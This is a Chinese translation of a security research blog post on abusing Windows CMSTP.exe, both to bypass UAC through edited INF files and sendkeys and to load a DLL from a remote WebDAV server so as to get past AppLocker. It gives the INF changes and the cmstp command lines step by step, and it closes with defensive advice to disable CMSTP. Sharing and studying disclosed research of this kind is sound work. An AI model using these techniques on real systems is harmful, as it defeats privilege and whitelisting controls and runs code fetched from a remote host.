> 原文链接: https://www.anquanke.com//post/id/86685 


# 【技术分享】利用CMSTP.exe实现UAC Bypass和加载DLL


                                阅读量   
                                **177227**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：msitpros.com
                                <br>原文地址：[https://msitpros.com/?p=3960](https://msitpros.com/?p=3960)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t017dcad37941151279.jpg)](https://p1.ssl.qhimg.com/t017dcad37941151279.jpg)**

****

译者：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)

预估稿费：120RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**

我乐于花时间深入研究Windows内部的二进制文件以发现隐藏的功能。本文就是我发现的关于CMSTP.exe文件的一些东西。

我发现了使用sendkeys来绕过UAC的方式及从Webdav服务器加载DLL的方式。我知道我发现的绕过方式有点无聊，但是如果这能鼓励其他人一起加入研究，我将非常高兴。在这个二进制文件中可能有更多的东西等待被发现，所以我们继续往下看。

我已经把这个问题报告给了MSRC，他们已经解决了这个问题。

UAC绕过漏洞通常问题不大，可以通过合理配置阻止终端用户访问本地管理员功能。（UAC不是安全边界）

如果你想要了解更多UAC相关的内容，我推荐阅读[James Foreshaw](https://twitter.com/tiraniddo)的精彩文章：

[https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-1.html](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-1.html)<br>       [https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-2.html](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-2.html)<br>       [https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-3.html](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-3.html)

**<br>**

**0x01绕过UAC**

下载下面的inf文件和脚本文件，把他们保存到系统中：

[https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1)<br>       [https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf)

调整脚本并运行，结果如下：

[https://msitpros.com/wp-content/uploads/2017/08/UAC-Bypass-Sendkeys-CMSTP.gif](https://msitpros.com/wp-content/uploads/2017/08/UAC-Bypass-Sendkeys-CMSTP.gif)

[![](https://p3.ssl.qhimg.com/t014b2dae6963f07c2b.png)](https://p3.ssl.qhimg.com/t014b2dae6963f07c2b.png)

**<br>**

**0x02从Webdav加载DLL**

下载下面的文件（文件名很重要）：

[https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cmp](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cmp)<br>       [https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cms](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cms)<br>       [https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-inf](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-inf)

调整inf文件中的“RegisterOCXSection”，将它指向托管于你的Webdav服务器上的DLL。

然后运行下面的命令（文件名很重要）：

```
Cmstp.exe /ni /s c:cmstpCorpVPN.inf
```

[https://msitpros.com/wp-content/uploads/2017/08/WebDavDLLLoadBlog.gif](https://msitpros.com/wp-content/uploads/2017/08/WebDavDLLLoadBlog.gif)

[![](https://p2.ssl.qhimg.com/t0189222d9af22cbd52.png)](https://p2.ssl.qhimg.com/t0189222d9af22cbd52.png)

**<br>**

**0x03绕过UAC的步骤**

本节，我将描述所有的步骤。下面会有很多截图，但是我认为是有必要的。

如果你不加参数启动了cmstp.exe，结果如下：

[![](https://p4.ssl.qhimg.com/t01fd6da1e2daf7866c.png)](https://p4.ssl.qhimg.com/t01fd6da1e2daf7866c.png)

如何创建这些配置文件和它们如何安装才是有趣的地方。

我阅读了一些关于CMAK（Connection Manager Administration Kit）的资料——其是Windows的一个功能，因此我继续通过如下方式启动了它：

[![](https://p4.ssl.qhimg.com/t0183f5b2c1eb3e3530.png)](https://p4.ssl.qhimg.com/t0183f5b2c1eb3e3530.png)

当这个功能安装完成后，你能在开始菜单中启动CMAK。它的图标如下：

[![](https://p1.ssl.qhimg.com/t01535df26e91477d8d.png)](https://p1.ssl.qhimg.com/t01535df26e91477d8d.png)

在启动CMAK后，会出现下面的向导。下面的截图是我选择的选项：

[![](https://p1.ssl.qhimg.com/t01d85719e1dc958d2b.png)](https://p1.ssl.qhimg.com/t01d85719e1dc958d2b.png)

[![](https://p0.ssl.qhimg.com/t01b443d07f10beffc3.png)](https://p0.ssl.qhimg.com/t01b443d07f10beffc3.png)

[![](https://p1.ssl.qhimg.com/t019a26c6fe57ba211d.png)](https://p1.ssl.qhimg.com/t019a26c6fe57ba211d.png)

[![](https://p4.ssl.qhimg.com/t01e8eded8752f657d6.png)](https://p4.ssl.qhimg.com/t01e8eded8752f657d6.png)

[![](https://p0.ssl.qhimg.com/t01fc6173be48e0f7dd.png)](https://p0.ssl.qhimg.com/t01fc6173be48e0f7dd.png)

[![](https://p4.ssl.qhimg.com/t016400de142d989340.png)](https://p4.ssl.qhimg.com/t016400de142d989340.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e270866db3cdaf37.png)

[![](https://p3.ssl.qhimg.com/t018a006554c207708e.png)](https://p3.ssl.qhimg.com/t018a006554c207708e.png)

[![](https://p4.ssl.qhimg.com/t01130f36ddc1a769fc.png)](https://p4.ssl.qhimg.com/t01130f36ddc1a769fc.png)

[![](https://p1.ssl.qhimg.com/t018443abdeed1c4d21.png)](https://p1.ssl.qhimg.com/t018443abdeed1c4d21.png)

[![](https://p2.ssl.qhimg.com/t01cef9aefa0881577d.png)](https://p2.ssl.qhimg.com/t01cef9aefa0881577d.png)

[![](https://p1.ssl.qhimg.com/t01956f36cf037488bd.png)](https://p1.ssl.qhimg.com/t01956f36cf037488bd.png)

[![](https://p2.ssl.qhimg.com/t012f25bdd0122b13fb.png)](https://p2.ssl.qhimg.com/t012f25bdd0122b13fb.png)

[![](https://p5.ssl.qhimg.com/t01d49183bc4ef9c93d.png)](https://p5.ssl.qhimg.com/t01d49183bc4ef9c93d.png)

[![](https://p3.ssl.qhimg.com/t01eb025486c14d4cfe.png)](https://p3.ssl.qhimg.com/t01eb025486c14d4cfe.png)

[![](https://p3.ssl.qhimg.com/t01f01cce27f7abce2b.png)](https://p3.ssl.qhimg.com/t01f01cce27f7abce2b.png)

[![](https://p0.ssl.qhimg.com/t01a8a04f67f4218f31.png)](https://p0.ssl.qhimg.com/t01a8a04f67f4218f31.png)

[![](https://p3.ssl.qhimg.com/t0112281ab38f79b235.png)](https://p3.ssl.qhimg.com/t0112281ab38f79b235.png)

[![](https://p0.ssl.qhimg.com/t018dbf1efefff62f6f.png)](https://p0.ssl.qhimg.com/t018dbf1efefff62f6f.png)

[![](https://p2.ssl.qhimg.com/t01889e93f377df83df.png)](https://p2.ssl.qhimg.com/t01889e93f377df83df.png)

[![](https://p1.ssl.qhimg.com/t01b3ea4a43af72eb48.png)](https://p1.ssl.qhimg.com/t01b3ea4a43af72eb48.png)

文件位于向导中显示的路径下。我的这个例子中是：C:Program FilesCMAKProfilesWindows Vista and aboveCorpVPN

[![](https://p3.ssl.qhimg.com/t017db3ba0e129d4f84.png)](https://p3.ssl.qhimg.com/t017db3ba0e129d4f84.png)

这个.exe和.sed文件是IEXPRESS（Windows中用于创建“installer“的二进制文件）文件。可以忽略它们。更多关于IEXPRESS的细节如下：[https://en.wikipedia.org/wiki/IExpress](https://en.wikipedia.org/wiki/IExpress)

现在可以愉快的玩耍了。

在C盘下创建一个文件夹（名为CMSTP）。复制CorpVPN.inf文件到这个目录中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b891bd4518dafa28.png)

现在使用记事本打开inf文件，找到RunPreSetupCommandsSection，然后添加下面两行代码（第一行是你想运行的命令）：

```
c:windowssystem32cmd.exe
 taskkill /IM cmstp.exe /F
```

[![](https://p0.ssl.qhimg.com/t01e6e84f3530aab840.png)](https://p0.ssl.qhimg.com/t01e6e84f3530aab840.png)

你需要注释下面两行：

```
CopyFiles=Xnstall.CopyFiles, Xnstall.CopyFiles.ICM
 AddReg=Xnstall.AddReg.AllUsers
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0186b6aeabfcfc1bd1.png)

现在，如果你运行下面的命令行，点击提示框：

```
C:WindowsSystem32cmstp.exe c:cmstpcorpvpn.inf /au
```

[![](https://p1.ssl.qhimg.com/t014a36badb217fa00f.png)](https://p1.ssl.qhimg.com/t014a36badb217fa00f.png)

奇怪的是这个可执行文件不该自动提权。如果我们运行sigcheck检测这个文件，从转储的manifest中我们可以确认这个：

[![](https://p3.ssl.qhimg.com/t01d8865699ec3e9ea7.png)](https://p3.ssl.qhimg.com/t01d8865699ec3e9ea7.png)

同时，如果我们检查这个进程的特权级，我们确定它默认不该提权，但是现在运行于medium特权级：

[![](https://p1.ssl.qhimg.com/t0140013a195cf2e57e.png)](https://p1.ssl.qhimg.com/t0140013a195cf2e57e.png)

现在有趣的是我们可以使用脚本中的sendkeys来自动提权。所有需要的东西我们都有了。

微软在过去已经采取了安全措施（[UIPI](https://en.wikipedia.org/wiki/User_Interface_Privilege_Isolation)）来阻止sendkeys攻击，因此我很惊讶这个还能起作用。我认为这有点酷啊。。。

我创建了一个简单的脚本：

[https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1)

我还编写了个预置的UACBypass.inf文件，因此你不需要按照上述步骤来安装CMAK：

[https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf)

我没有时间来逆向CMSTP以查看它是如何提权的，但是其他人可以进一步研究。如果我有时间我也会研究下。

<br>

**0x04从Webdav服务器实现加载DLL的步骤**

我还发现了你能从Webdav中加载DLL文件，并执行它们。这在一些场景中能用于绕过AppLocker。你能按照绕过UAC中的CMAK向导教程来完成这个。

你需要在INF文件中添加下面的内容（你能看到从磁盘加载的dll）：

```
[RegisterOCXSection]
 \10.10.10.10webdavAllTheThings.dll
```

[![](https://p5.ssl.qhimg.com/t01e152e1bd7d437875.png)](https://p5.ssl.qhimg.com/t01e152e1bd7d437875.png)

在你运行这个命令之前，你还需要CorpVPN.cmp和CorpVPN.cms，将它们放置于和INF文件同目录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0142c2450ce53975fb.png)

当然你的DLL文件需要位于Webdav服务器上。

现在，你应该能运行下面的命令来加载DLL了：

```
cmstp.exe /ni /s c:cmstpCorpVPN.inf
```

注意，这将安装一个VPN配置，我还没发现其他更好的方式来加载dll。

AllTheThings.dll来自Casey Smith（[@Subtee](https://twitter.com/subTee)）的分享：

[https://github.com/subTee/AllTheThings](https://github.com/subTee/AllTheThings)

作为防御者，我开始研究CMSTP.exe，如果你开启了Device Guard/Applocker，我建议禁用CMSTP。（除非你需要依赖它来安装VPN连接）。
